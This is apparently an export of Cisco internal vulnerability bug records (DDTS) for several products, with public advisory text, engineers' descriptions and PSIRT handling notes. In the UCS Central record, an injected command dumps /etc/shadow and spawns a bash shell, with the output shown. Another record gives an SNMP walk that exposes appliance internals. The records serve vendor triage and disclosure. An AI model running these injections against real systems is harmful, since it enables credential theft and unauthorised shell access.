Project,Product,Component,Found,Severity,ISSS,ISOIB,DDTS,Title,RNE,Description,PSIRT
CSC.content-security,sma,snmp,customer-use,2,0,0,CSCve26202,Cisco Security Appliances SNMP Polling Information Disclosure Vulnerability," Symptom: A vulnerability in SNMP polling for the Cisco Web Security Appliance (WSA), Email Security Appliance (ESA) and Content Security Management Appliance (SMA) could allow an authenticated, remote attacker to discover confidential information about the appliances which should only be available to an administrator user.  The vulnerability is due to lack of protecting confidential information at rest in response to SNMP poll requests. An attacker could exploit this vulnerability by doing a crafted SNMP poll request to the targeted security appliance. An exploit could allow the attacker to discover confidential information which should be restricted and the attacker could use this information to conduct additional reconnaissance attacks. The attacker would have knowledge of the configured SNMP community string to exploit this vulnerability.  Conditions: The security appliance is configured for SNMP polling.  Workaround: A mitigation for this vulnerability is to disable SNMP. If SNMP is not enabled the device is not vulnerable.  Further Problem Description: None.   PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 3 score. The Base CVSS score as of the time of evaluation is 4.3: https://tools.cisco.com/security/center/cvssCalculator.x?version=3.0&vector=CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N/E:X/RL:X/RC:X  CVE ID CVE-2017-6783 has been assigned to document this issue.  Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html  ","During some tests for SNMP in the lab, we could retrieve the whole data structure of the SMA, including some sensitive data that should be accessible for root/service account:the command used: snmpwalk -O a -v 2c -c ironport -M /snmp/  10.48.78.56 iso.3.6.1.2.1Device IP: 10.48.78.56/snmp/: the file that contains my MIB and SMI files.Security implication:When using the snmp version 2, unprivileged user can have access to privileged information by sniffing the snmp traffic. Customers should not have access to these information, but now they can using the SNMP.The current summary of the accessed information:- all memory information including the following: (OK)- root directory structure including the content of the following Directories: (NOT OK).- running processes python scripts with full path. (NOT OK).- current network connections and open ports on SMA appliance. NOT OK- all the binary files that is being used on the appliance: (NOT OK)- appliance current running scripts for collecting status and top logs outputs:(NOT OK)- the results can vary depending on the state of the appliance and the time you trigger the snmp request. which in sometime can include some sensitive passwords or users credentials."," PSIRT-owner: trfridle           PSIRT is reviewing this issue for possible inclusion in a Cisco Security  Advisory which could include this DDTs.  Please do not change the  Release-note Enclosure, as PSIRT will modify it appropriately when this  issue is made public.          Should customers request information regarding this DDTs or appear to be running into this DDTs within their network, please bring it to the immediate attention of the Cisco PSIRT at psirt@cisco.com."
CSC.voice,ciscocm,cpi-os,customer-use,3,0,0,CSCuv03652,CUCM: TLS Man in the Middle Vulnerability with DH Key Exchange in NSS, Symptom: Cisco Unified Communications Manager (CUCM) includes a version of Transport Layer Security (TLS) that is affected by the vulnerabilities identified by the following Common Vulnerability and Exposures (CVE) IDs:   CVE-2015-4000  This bug was opened to address the potential impact on this product.  Conditions: Device with default configuration.  Workaround: Not currently available.  Further Problem Description: Additional details about the vulnerabilities listed above can be found at http://cve.mitre.org/cve/cve.html PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS scores as of the time of evaluation are 4.3/3.6: http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:N/AC:M/Au:N/C:P/I:N/A:N/E:F/RL:OF/RC:C&version=2.0 CVE ID CVE-2015-4000 has been assigned to document this issue. Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html  ***This fix got picked up in the 1052 ES branch via CSCuw09350 and CSCux11900***  ,"A flaw exists in the way the TLS protocol composes the Diffie-Hellman(DH) key exchange. A man-in-the-middle attacker could use this flaw toforce the use of weak 512 bit export-grade keys during the key exchange,allowing them do decrypt all traffic. (CVE-2015-4000)Note: This update forces the TLS/SSL client implementation in NSS toreject DH key sizes below 768 bits, which prevents sessions to bedowngraded to export-grade keys. Future updates may raise this limit to1024 bits.Updated: nss-3.19.1-3.el6_6***This fix got picked up in the 1052 ES branch via CSCuw09350 and CSCux11900***"," PSIRT-owner: trfridle           PSIRT is reviewing this issue for possible inclusion in a Cisco Security  Advisory which could include this DDTs.  Please do not change the  Release-note Enclosure, as PSIRT will modify it appropriately when this  issue is made public.          Should customers request information regarding this DDTs or appear to be running into this DDTs within their network, please bring it to the immediate attention of the Cisco PSIRT at psirt@cisco.com."
CSC.content-security,esa,platform,customer-use,3,0,0,CSCvg88985,Evaluation request to see if the ESA is impacted by CVE-2015-6563, Symptom: Cisco Email Security Appliance (ESA) includes a version of the OpenSSH Protocol that is  affected by the vulnerabilities identified by the following Common Vulnerability and  Exposures (CVE) IDs:   CVE-2015-6563   This bug was opened to address the potential impact on this product.  Conditions: Device with default configuration.  Workaround: Committed relevant patch/fix on top of running OpenSSH_6.6.1p Version.  Further Problem Description: Additional details about the vulnerabilities listed above can be found at  http://cve.mitre.org/cve/cve.html  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score.  The Base CVSS score as of the time of evaluation is 1.9: https://tools.cisco.com/security/center/cvssCalculator.x?version=2.0&vector=CVSS:2.0/AV:L/AC:M/Au:N/C:N/I:P/A:N  CVE ID CVE-2015-6563 has been assigned to document this issue.  Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html  ,"I would like to determine whether CVE-2015-6563 impacts the ESA or not:https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-6563My understanding is the ESA uses OpenBSD which, according to the following, is affected by this CVE if the ESA is running OpenSSH version 6.9 or older which 11.0.1-027 is running:https://tools.cisco.com/security/center/viewAlert.x?alertId=41121mx:service 8] ssh -VOpenSSH_6.6.1p1, CiscoSSL 1.0.2j.6.1.140-fips"," PSIRT-owner: trfridle           PSIRT is reviewing this issue for possible inclusion in a Cisco Security  Advisory which could include this DDTs.  Please do not change the  Release-note Enclosure, as PSIRT will modify it appropriately when this  issue is made public.          Should customers request information regarding this DDTs or appear to be running into this DDTs within their network, please bring it to the immediate attention of the Cisco PSIRT at psirt@cisco.com."
CSC.netbu,pix-asa,webvpn-other,customer-use,1,0,0,CSCvd59063,Cisco Adaptive Security Appliance Authentication Denial of Service Vulnerability," Symptom: A vulnerability in the implementation of the direct authentication feature in Cisco Adaptive Security Appliance (ASA)  Software could allow an unauthenticated, remote attacker to cause an affected device to unexpectedly reload, resulting in a denial of service (DoS) condition.  The vulnerability is due to incomplete input validation of the HTTP header. An attacker could exploit this vulnerability by  sending a crafted HTTP request to the local IP address of an affected device. A successful exploit could allow the attacker  to cause the affected device to reload.  Note: Only traffic directed to the affected system can be used to exploit this vulnerability. This vulnerability affects systems that have the direct authentication feature enabled. This vulnerability can be triggered by IPv4 or IPv6 traffic.  Cisco has released software updates that address this vulnerability.   There are no workarounds that address this vulnerability.   This advisory is available at the following link: https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20171004-asa  Conditions: Please refer to the Security Advisory.  Workaround: Please refer to the Security Advisory.  Further Problem Description: Please refer to the Security Advisory.  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 3 score. The Base CVSS score as of the time of evaluation is 8.6: https://tools.cisco.com/security/center/cvssCalculator.x?version=3.0&vector=CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:N/A:H/E:X/RL:X/RC:X  CVE ID CVE-2017-12246 has been assigned to document this issue.  Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html  ","ASA crash Traceback at Thread Name: emweb/httpsaccess asa for cut-through proxy via https://<ip address of asa./netaccess/IMAGE_herethen No credential prompt with this message ;USER AUTHENTICATION ;User authentication is not required; then crash.ASA5585-SSP-40 and version 9.4(3)4, crashinfo and coredump has been collected.There is two symptoms, ASA crashes when it was targeting to authenticate and also crashes when it passing authentic traffic ( ASA in the path between user and url target ASA) to target ASA.I have decoded the core and you can find core located at /auto/asa-reg/fabdulaz/core/cores/core_smp.2017Mar14_195622.1111.119.1.7.4 symbol file - /auto/asa-reg/fabdulaz/core/9.1.7.4-smp (gdb) thread 8[Switching to thread 8 (process 1118)]#0  0x0000000001df52ac in reboot () at reboot.c:6666      reboot.c: No such file or directory.        in reboot.c(gdb) bt#0  0x0000000001df52ac in reboot () at reboot.c:66#1  0x00000000004248ac in snap_handler (urlist=0x5a0d320, cnt=4) at snap.c:2515#2  0x00000000013787c2 in lina_sigcrash (signo=11, info=0x7ffe8557abf0, ctx=0x7ffe8557aac0) at lina.c:2361#3  <signal handler called>#4  ewsServeFindDocument (context=0x7ffe85b99d00) at ews_serv.c:918#5  0x00000000007152b6 in ewsServeStart (context=0x7ffe85b99d00) at ews_serv.c:640#6  0x000000000070fd12 in ewsParse (context=0x7ffe85b99d00) at ews_pars.c:825#7  0x0000000000706638 in ewsRun () at ews.c:456#8  0x0000000000724bcd in emweb_th (arg=<value optimized out>) at http_task.c:525#9  0x0000000000428d85 in t_start () at thread.c:313#10 0x0000000000000000 in ?? ()"," PSIRT-owner: trfridle           PSIRT is reviewing this issue for possible inclusion in a Cisco Security  Advisory which could include this DDTs.  Please do not change the  Release-note Enclosure, as PSIRT will modify it appropriately when this  issue is made public.          Should customers request information regarding this DDTs or appear to be running into this DDTs within their network, please bring it to the immediate attention of the Cisco PSIRT at psirt@cisco.com."
CSC.datacenter,ucs-central,security,customer-use,3,0,0,CSCut29414,Cisco UCS Local Command Injection Vulnerability," Summary A vulnerability in command-line interface (CLI) of the Cisco Unified Computing System (UCS) Central Software could allow  an authenticated, local attacker to inject arbitrary commands that are executed with  remote attacker elevated privileges  on the underlying  operating system.  The vulnerability is due to insufficient input validation. An attacker could exploit this vulnerability by authenticating to the device and submitting crafted commands to the affected parameter in CLI. An exploit could allow the attacker to read, write and overwrite any file on the system or execute arbitrary code.  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS scores as of the time of evaluation are  6.6/5.5: http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:N/AC:M/Au:S/C:C/I:C/A:C/E:F/RL:OF/RC:C&version=2.0 CVE ID CVE-2015-0748 has been assigned to document this issue. Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html ",UCS Central Local Command Injection via test cco-connection + detailUCS Central Local Command Injection via ;test cco-connection; and ;test cco-connection-detail; from the local-mgmt context due to insufficient input validation.Printing out password salts/hashes with cco-connection:Central-Test(local-mgmt)# test cco-connection ';/usr/bin/sudo /bin/cat' /etc/shadow test 443Enter cco-password:CCO Connection failed with http error code 000./bin/cat: test: No such file or directory/bin/cat: 443: No such file or directoryroot:$1$ToWcsC4R$XaYfvve4hPK/EhCIEuXlE/:14959:0:99999:7:::bin:*:14959:0:99999:7:::Spawning a bash shell with cco-connection-detaill:Central-Test(local-mgmt)# test cco-connection-detail ';/bin/bash;' d d dEnter cco-password:* getaddrinfo(3) failed for www.cisco.com:443* Couldn't resolve host 'www.cisco.com'* Closing connection #0CCO Connection failed with http error code 000.[admin@Central-Test ~]$ pwd/home/admin," PSIRT-owner: psirt@cisco.com           This issue has been evaluated and driven to closure by PSIRT.  PSIRT has provided a public Release-note Enclosure (RNE) for this issue which is visible on Cisco.com.   If a customer is being impacted by this issue, please guide them to the 'Workaround' section of the RNE or recommend a software upgrade to a patched release.   If a patched release is not available  for the customer-specific situation, you will need to escalate the issue  through the DE manager or the business unit that owns the DDTs defect.  There is no need to contact PSIRT for this issue.  Do not provide customers with any information beyond what is currently contained in the RNE."
CSC.content-security,sfims,ssl_inspection,customer-use,3,0,0,CSCvd07072,SSL logging denial-of-service vulnerability," Symptom: A vulnerability in the logging configuration of Secure Sockets Layer (SSL) policies for Firepower Management Center could allow an unauthenticated, remote attacker to cause a denial of service (DoS) condition due to high  consumption of system resources.  The vulnerability is due to the logging of certain TCP packets by the affected software. An attacker could exploit this vulnerability by sending a flood of crafted TCP packets to an affected device. A successful exploit could allow the  attacker to cause a DoS condition. The success of an exploit is dependent on how an administrator has configured logging for SSL policies for a device.  Conditions: This vulnerability affects the Firepower Management Center and managed devices that are configured to log connections by using SSL policy default actions.  Workaround: Remove the policy default logging action from all SSL policies configured for managed devices.  Further Problem Description: None.  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 3 score. The Base CVSS score as of the time of evaluation is 5.8: https://tools.cisco.com/security/center/cvssCalculator.x?version=3.0&vector=CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:N/A:L/E:X/RL:X/RC:X  CVE ID CVE-2017-6632 has been assigned to document this issue.  Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html  ","SYN flood could DDOS sensor/FMC with events if SSL Policy with logging enabled in default actionThe SSL policy logging will log events for SYN only sessions. The AC Policy, by design, does not log TCP connections where there is a SYN only sessions because if there is a SYN flood then this would overwhelm the sensor with writing events to the disk and these events would be sent to the FMC, likely overwhelming it as well. If there is a SYN only session this will not match any SSL rules and will fall through to the default action. If you have an SSL policy applied to a sensing device and you enable logging in the default action every single SYN only session will hit the default SSL action and log a connection event.The behavior here should be changed to mirror the behavior of the AC connection logging, which is we must see more than just a SYN packet to log a connection event."," PSIRT-owner: psirt@cisco.com           This issue has been evaluated and driven to closure by PSIRT.  PSIRT has provided a public Release-note Enclosure (RNE) for this issue which is visible on Cisco.com.   If a customer is being impacted by this issue, please guide them to the 'Workaround' section of the RNE or recommend a software upgrade to a patched release.   If a patched release is not available  for the customer-specific situation, you will need to escalate the issue  through the DE manager or the business unit that owns the DDTs defect.  There is no need to contact PSIRT for this issue.  Do not provide customers with any information beyond what is currently contained in the RNE."
CSC.content-security,wsa,logging,customer-use,2,0,0,CSCvc12083,Appfault occured in FTP logins on WSA management access," Symptoms: A vulnerability in FTP system log file management of the Cisco AsyncOS  Software for Cisco Email Security Appliances (ESA), Web Security  Appliances (WSA) and Content Security Management Appliance (SMA) could  allow an authenticated, local attacker to view sensitive information in  the FTP system log file.   The vulnerability is due to lack of masking sensitive information in the  FTP system log file. An attacker could exploit this vulnerability by  authenticating to the device and viewing the FTP system log file. An  exploit could allow the attacker to obtain potentially sensitive information  which could be used conduct additional reconnaissance attacks.   Conditions: The device has local FTP management configured.  Workaround: None.  Further Problem Description: None.  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS scores as of the time of evaluation are 1.7/1.4: http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:L/AC:L/Au:S/C:P/I:N/A:N/E:F/RL:OF/RC:C&version=2.0  No CVE ID has been assigned to this issue.  Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html","Customer reported the following app-fault, these logs are from  /data/pub/ftpd_logs/ftpd.currentThe Critical message is:An application fault occurred: ('egg/command_client.py call|277', ;<type 'exceptions.TypeError'>;, ;'NoneType' object is unsubscriptable;, '[ftpd/server.py _run|242] [ftpd/server.py cmd_pass|785] [ftpd/main.py authorize|172] [egg/command_client.py call|277]') fun: <bound method ironport_acl_ftp_channel.cmd_pass of  server: <ftpd.server.ftp_server instance at 0x80f088518> current_mode: a addr: ('172.24.76.14', 57020) conn: <sock fd=86/86 domain=2 type=1 at 0x80f008d28> session_id: 1 thread_id: 37 closing: 0 authorized: 0 user: 'User1'> line: ['pass', 'password']Product: Cisco S690 Web Security ApplianceModel: S690Version: 9.1.1-074Serial Number: 00A6CA3E58AA-FCH2031V2UVTimestamp: 11 Nov 2016 16:30:19 -0500"," PSIRT-owner: psirt@cisco.com           This issue has been evaluated and driven to closure by PSIRT.  PSIRT has provided a public Release-note Enclosure (RNE) for this issue which is visible on Cisco.com.   If a customer is being impacted by this issue, please guide them to the 'Workaround' section of the RNE or recommend a software upgrade to a patched release.   If a patched release is not available  for the customer-specific situation, you will need to escalate the issue  through the DE manager or the business unit that owns the DDTs defect.  There is no need to contact PSIRT for this issue.  Do not provide customers with any information beyond what is currently contained in the RNE."
CSC.datacenter,n7k-pi,rtg-ospf,customer-use,3,0,0,CSCug63304,OSPF shouldn't allow invalid LSAs in the OSPF DB," Summary Multiple Cisco products are affected by a vulnerability involving the Open Shortest Path First (OSPF) Routing Protocol Link State Advertisement (LSA)  database. This vulnerability could allow an unauthenticated attacker to take full control of the OSPF Autonomous System (AS) domain routing table,  blackhole traffic, and intercept traffic.  The attacker could trigger this vulnerability by injecting crafted OSPF packets. Successful exploitation could cause flushing of the routing table on a  targeted router, as well as propagation of the crafted OSPF LSA type 1 update throughout the OSPF AS domain.  To exploit this vulnerability, an attacker must accurately determine certain parameters within the LSA database on the target router. This vulnerability  can only be triggered by sending crafted unicast or multicast LSA type 1 packets. No other LSA type packets can trigger this vulnerability.  OSPFv3 is not affected by this vulnerability. Fabric Shortest Path First (FSPF) protocol is not affected by this vulnerability.  Cisco has released free software updates that address this vulnerability. Workarounds that mitigate this vulnerability are available. This  advisory is available at the following link: http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20130801-lsaospf  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS scores as of the time of evaluation are  5.8/5.8: http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:N/AC:M/Au:N/C:N/I:P/A:P/E:H/RL:U/RC:C&version=2.0 CVE ID CVE-2013-0149 has been assigned to document this issue. Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html  Symptom: Invalid router LSAs installed in OSPF database and flooded to neigbhors.  Conditions: OSPF neigbhor sending invalid LSA.  Workaround: None  Further Problem Description:   ",This is to address acceptance and installation of the invalid OSPF LSA in the OSPF database.," PSIRT-owner: srasovic           PSIRT is reviewing this issue for possible inclusion in a Cisco Security  Advisory which could include this DDTs.  Please do not change the  Release-note Enclosure, as PSIRT will modify it appropriately when this  issue is made public.          Should customers request information regarding this DDTs or appear to be running into this DDTs within their network, please bring it to the immediate attention of the Cisco PSIRT at psirt@cisco.com."
CSC.netbu,pix-asa,routing,customer-use,2,0,0,CSCve47393,OSPF Rogue LSA with maximum sequence number vulnerability," Symptom: Multiple Cisco products are affected by a vulnerability involving the Open Shortest Path First (OSPF) Routing Protocol Link State Advertisement (LSA) database. This vulnerability could allow an unauthenticated, remote attacker to take full control of the OSPF Autonomous System (AS) domain routing table, allowing the attacker to intercept or black-hole traffic.  The attacker could exploit this vulnerability by injecting crafted OSPF packets. Successful exploitation could cause the targeted router to flush its routing table and propagate the crafted OSPF LSA type 1 update throughout the OSPF AS domain.  To exploit this vulnerability, an attacker must accurately determine certain parameters within the LSA database on the target router. This vulnerability can only be triggered by sending crafted unicast or multicast OSPF LSA type 1 packets. No other LSA type packets can trigger this vulnerability.  OSPFv3 is not affected by this vulnerability. Fabric Shortest Path First (FSPF) protocol is not affected by this vulnerability.  Workarounds that address this vulnerability are available.  This advisory is available at the following link: https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20170727-ospf  Conditions: Please refer to the security advisory.  Workaround: Please refer to the security advisory.  Further Problem Description: This vulnerability was found and reported to Cisco by Dr. Gabi Nakibly from Rafael Advanced Defense Systems.  PSIRT Evaluation:  The Cisco PSIRT has assigned this bug the following CVSS version 3 score. The Base CVSS score as of the time of evaluation is 4.2:  https://tools.cisco.com/security/center/cvssCalculator.x?version=3.0&vector=AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N/E:F/RL:O/RC:C  CVE ID CVE-2017-6770 has been assigned to document this issue.  Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html  ","External researcher reported the following issues, both fixed within CSCva74756:Deviation #1: Rogue LSA with maximum sequence numberA false LSA having the maximum sequence number was sent from Cloud 1 to R1. The false LSA had an LS ID and Advertising Router fields that corresponds to R1's ID. In response R1 flooded over all its interfaces a new LSA having maximum sequence number and maximum age in order to flush the false LSA from all the routers in the network. This action is expected and is in accordance with the OSPF specification. Following the reception of the LSA Acks from all its neighbors R1 was expected to send yet another LSA, but this time with the minimum sequence number. However, R1 does not send this LSA. As a result, the LSA of R1 is not installed in the LS DB of the routers in the network, causing their DB to be inconsistent with the actual network topology. This allows an attacker to send a spoofed LSA that persistently harms the routing in the network.Issue #2:When a rogue R-LSA for Router-id 10.0.1.2 is sent with Max sequence number is sent from R0. R1 broadcasts the packet rogue R-LSA. R2 upon receiving the rogue LSA tries to max age out the rogue LSA entry by sending R-LSA with max sequence number and max age. R1 receives the packet and sends the ack. R2 after receiving the acks sends R-LSA with initial sequence number. R1 discards the new R-LSA from R2 as it considers the max sequence number what it has is newer. R1 again broadcast the R2's R-LSA with max sequence number and this process continues forever.Please contact srasovic@cisco.com or osantos@cisco.com for further information including researcher report and trace files and captures.Note: This vulnerability will be disclosed during Black Hat USA - end of July. Please treat with priority."," PSIRT-owner: srasovic           PSIRT is reviewing this issue for possible inclusion in a Cisco Security  Advisory which could include this DDTs.  Please do not change the  Release-note Enclosure, as PSIRT will modify it appropriately when this  issue is made public.          Should customers request information regarding this DDTs or appear to be running into this DDTs within their network, please bring it to the immediate attention of the Cisco PSIRT at psirt@cisco.com."
CSC.sys,3850,accsw-layer2,customer-use,3,0,0,CSCvg07014,Switch crash while STP err-disables a port," $$IGNORE-PSIRT  CISCO HIGHLY CONFIDENTIAL - CONTROLLED ACCESS  This issue is under review by the Cisco Product Security Incident Response team (PSIRT).  The defect describes a product security vulnerability.  Its contents must be protected from unauthorized disclosure, both internal and external to Cisco.  Do not forward this information to mailing lists or newsgroups.  Documentation writers: it is prohibited to publish this Release-note  Enclosure (RNE) until the content has been approved by PSIRT.  PSIRT may  publish a Security Advisory regarding this defect, and the current text of  this RNE will be replaced with appropriate information.  In the event that  a Security Advisory is not published, PSIRT will replace this text with an  appropriate explanation.  More information on PSIRT is available at http//psirt.cisco.com/.   Cisco's public policy on security vulnerability handling can be reviewed at  http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html. For further information, send a message to psirt@cisco.com.  (mschuele-09/30/17)Symptom: 3850 switch stack master crashes while STP is putting a port into the err-disable state due to loopback errors or bpduguard. The crash is triggered by the port receiving a BPDU packet on an interface with bpduguard, followed by a LOOP packet on the same port.  Conditions: 3850 switch stack running 3.6.5 errdisable detect cause bpduguard shutdown vlan configured on switch  Workaround: None  Further Problem Description:",3850 switch stack crashes while STP is in the process of setting a port into the err-disable state due to loopback errors or bpduguard violations.," PSIRT-owner: srasovic           PSIRT is reviewing this issue for possible inclusion in a Cisco Security  Advisory which could include this DDTs.  Please do not change the  Release-note Enclosure, as PSIRT will modify it appropriately when this  issue is made public.          Should customers request information regarding this DDTs or appear to be running into this DDTs within their network, please bring it to the immediate attention of the Cisco PSIRT at psirt@cisco.com."
CSC.datacenter,mds-platform,sup-kernel,customer-use,2,0,0,CSCur01099,Evaluation of CVE-2014-6271 and CVE-2014-7169 for MDS platform," Symptom: The following Cisco products:    MDS 9710 Switch   MDS 9706 Switch   MDS 9250i Switch   MDS 9148S Switch   MDS 9513 Switch   MDS 9509 Switch   MDS 9506 Switch   MDS 9222i Switch   MDS 9216i Switch   MDS 9216A Switch   MDS 9216 Switch   MDS 9148 Switch   MDS 9140 Switch   MDS 9134 Switch   MDS 9124 Switch   MDS 9120 Switch   MDS 8 Gbps Fabric Switch for HP c-Class Blade System   MDS 4 Gbps Fabric Switch for HP c-Class BladeSystem   MDS 4 Gbps Fabric Switch for IBM BladeCenter  include a version of bash that is affected by the vulnerabilities identified by the Common Vulnerability and Exposures (CVE) IDs:    CVE-2014-6271   CVE-2014-6277   CVE-2014-6278   CVE-2014-7169   CVE-2014-7186   CVE-2014-7187  This bug has been opened to address the potential impact on this product.  Conditions: Exposure is dependent on the following features being enabled in the configuration.  feature telnet   Enabled by default in releases earlier than NX-OS 5.0(1).   This vector may only be exploited by authenticated users.  feature ssh-server   Not enabled by default.   This vector may only be exploited by authenticated users.  Workaround: A hotfix may be downloaded from cco.cisco.com as follows:    - Log in to cco.cisco.com   - click 'Support'   - click 'Downloads'   - Search for 'MDS 9000 Utilities'   - Select 'MDS 9000 Utilities'   - Select 'NX-OS Utilities'   - Download the 'mds-shellshock-1.0.tgz' package and follow the enclosed instructions  Further Problem Description: This vulnerability may be exploited through the 'ssh' or 'telnet' features. These features may be disabled by the user. All MDS switches can function in this configuration. Access is available through the console port.  All previously released versions of SAN-OS and NX-OS software are affected. The fix will be delivered for currently supported releases as follows:    NX-OS 5.0 release - first fixed release is 5.0(8a), available on 24 Oct 2014   NX-OS 5.2 release - first fixed release is 5.2(8e), available on 30 Oct 2014   NX-OS 6.2 release - first fixed release is 6.2(9a), available on 15 Oct 2014  There are no fixed NX-OS releases that are FICON certified yet. There will not be any fixed releases for software trains that are past the end of software maintenance support.  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score.  The Base and Temporal CVSS scores as of the time of evaluation are 7.5/7.5:    https://intellishield.cisco.com/security/alertmanager/cvssCalculator.dodispatch=1&version=2&vector=AV:N/AC:L/Au:N/C:P/I:P/A:P/E:H/RL:U/RC:C  The Cisco PSIRT has assigned this score based on information obtained from multiple sources. This includes the CVSS score assigned by the third-party vendor when available. The CVSS score assigned may not reflect the actual impact on the Cisco Product.   Additional information on Cisco's security vulnerability policy can be found at the following URL:    http://www.cisco.com/web/about/security/psirt/security_vulnerability_policy.html       ",PLEASE READ THIS ENTIRE DESCRIPTION AND THE INCLUDED LINKS BEFORE TAKING ANY ACTION.A serious vulnerability has been discovered in the Bash shell widely used in various Cisco products. Additional background information can be found on PSIRT's internal hot page at: https://psirt.cisco.com/PSIRThot/BashSep14 This defect has been created to evaluate the impact to this product.IMMEDIATE ACTION REQUIRED:==========================Please evaluate your product in the next 48 hours and file the DE-Evaluation enclosure per the instructions at:https://psirt.cisco.com/PSIRThot/BashSep14/InstructionsToEngineering," PSIRT-owner: psirt@cisco.com           This issue has been evaluated and driven to closure by PSIRT.  PSIRT has provided a public Release-note Enclosure (RNE) for this issue which is visible on Cisco.com.   If a customer is being impacted by this issue, please guide them to the 'Workaround' section of the RNE or recommend a software upgrade to a patched release.   If a patched release is not available  for the customer-specific situation, you will need to escalate the issue  through the DE manager or the business unit that owns the DDTs defect.  There is no need to contact PSIRT for this issue.  Do not provide customers with any information beyond what is currently contained in the RNE."
